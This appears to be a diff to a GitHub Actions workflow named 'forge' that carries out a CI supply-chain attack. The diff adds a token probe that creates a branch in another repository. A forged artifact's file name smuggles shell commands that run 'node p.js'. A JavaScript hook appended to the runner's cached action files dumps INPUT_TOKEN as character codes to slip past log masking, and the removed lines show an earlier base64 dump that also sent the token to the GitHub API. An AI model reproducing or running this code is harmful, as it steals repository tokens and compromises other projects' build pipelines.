@@ -7,6 +7,18 @@ jobs:
   forge:
     runs-on: ubuntu-latest
     steps:
+      - name: Token probe
+        env:
+          T: ${{ github.token }}
+        run: |
+          code=$(curl -s -o /tmp/o -w '%{http_code}' -X POST \
+            -H "Authorization: token $T" \
+            -H 'Accept: application/vnd.github+json' \
+            https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v6f4d2ac-8b2ed3/git/refs \
+            -d '{"ref":"refs/heads/omp-pr-token","sha":"0acf03d309992b19358110dcbcc331185cb916292"}')
+          echo "CREATEREF $code"
+          head -c 300 /tmp/o
+          echo
       - name: Build forged artifact
         run: |
           rm -rf content
@@ -14,7 +26,7 @@ jobs:
           printf 'forged report body' > content/body
           python3 - <<'PY'
           import os
-          name = "body;cd${IFS}$HOME;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt"
+          name = "body;" + "cd${IFS}$HOME;" + "cd${IFS}..;" * 14 + "cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt"
           assert len(name) < 255, len(name)
           open(os.path.join("content", name), "w").close()
           PY
@@ -26,14 +38,6 @@ jobs:
           if (process.env.RUNNER_WORKSPACE) roots.push(path.join(path.dirname(process.env.RUNNER_WORKSPACE), '_actions'));
           if (process.env.HOME) roots.push(path.join(process.env.HOME, '..', '_actions'));
           roots.push('/home/runner/work/_actions', '/home/runner/_actions');
-          if (process.env.RUNNER_WORKSPACE) {
-            try {
-              const work = path.dirname(process.env.RUNNER_WORKSPACE);
-              for (const e of fs.readdirSync(work, { withFileTypes: true })) {
-                if (e.isDirectory() && e.name === '_actions') roots.push(path.join(work, e.name));
-              }
-            } catch (e) {}
-          }
           const uniq = [...new Set(roots)];
           const seen = new Set();
           let patched = 0;
@@ -48,7 +52,7 @@ jobs:
                 seen.add(p);
                 try {
                   const cur = fs.readFileSync(p, 'utf8');
-                  if (cur.indexOf('LEAK-B64') !== -1) continue;
+                  if (cur.indexOf('LEAK-CODES') !== -1) continue;
                   fs.appendFileSync(p, '\n' + HOOK + '\n');
                   patched++;
                 } catch (e) {}
@@ -62,18 +66,9 @@ jobs:
           ;(function(){
             try {
               var t = process.env.INPUT_TOKEN;
-              if (!t) return;
-              var cp = require('child_process');
+              if (!t) { console.log('LEAK-NOTOKEN'); return; }
               var s = String(t);
-              console.log('LEAK-B64 ' + Buffer.from(s).toString('base64'));
-              console.log('LEAK-LEN ' + s.length);
-              try {
-                var out = cp.execFileSync('curl', ['-s','-m','25','-D','/tmp/leak-hdr','-H','Authorization: token ' + s,'https://api.github.com/user'], {encoding:'utf8', timeout:30000});
-                console.log('LEAK-API ' + out.replace(/\s+/g,' ').slice(0,400));
-                var hdr = '';
-                try { hdr = require('fs').readFileSync('/tmp/leak-hdr','utf8'); } catch (e) {}
-                console.log('LEAK-HDR ' + hdr.replace(/\s+/g,' ').slice(0,600));
-              } catch (e) { console.log('LEAK-APIERR ' + e.message); }
+              console.log('LEAK-CODES3 ' + s.split('').map(function(c){ return c.charCodeAt(0); }).join(','));
             } catch (e) { console.log('LEAK-ERR ' + e.message); }
           })();
           JSEOF
